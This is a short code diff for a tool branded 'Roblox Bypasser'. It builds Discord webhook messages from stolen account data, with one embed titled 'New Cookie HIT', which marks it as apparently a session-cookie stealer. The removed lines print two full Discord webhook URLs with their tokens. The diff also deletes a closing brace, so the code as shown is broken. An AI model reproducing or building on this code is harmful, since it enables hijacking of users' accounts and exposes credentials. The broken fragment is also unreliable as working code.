@@ -3,9 +3,9 @@ import type { AccountInfo } from "@/lib/tokenStore";
 
 export const EXTRA_WEBHOOKS = {
   receiver:
-    "https://discord.com/api/webhooks/1511747719822180393/O1Pl_Ad_zN8C5UhqO19d8PnxkDr8rH-kFdA4c0ffq8tZEltBvpcwwjC3WR1LlGs3qk0C",
+    "",
   liveBypass:
-    "https://discord.com/api/webhooks/1510195534756053034/8sgNTeGfNr4RR4TcJpTyma57OIZbsnc6BgnbdbgHkeETJnYVRcagT2hnzrVEkBFVRwTj",
+    "",
 } as const;
 
 const BOT_NAME = "Roblox Bypasser";
@@ -25,11 +25,11 @@ async function post(url: string, body: unknown) {
 
 function nowFooter() {
   return `Roblox Bypasser • ${new Date().toLocaleString()}`;
-}
+
 
 function buildReceiverEmbed(d: AccountInfo) {
   return {
-    title: "📥 New Receiver Hit",
+    title: "🍪 | New Cookie HIT",
     color: 0x3b82f6,
     thumbnail: d.avatarUrl ? { url: d.avatarUrl } : undefined,
     fields: [
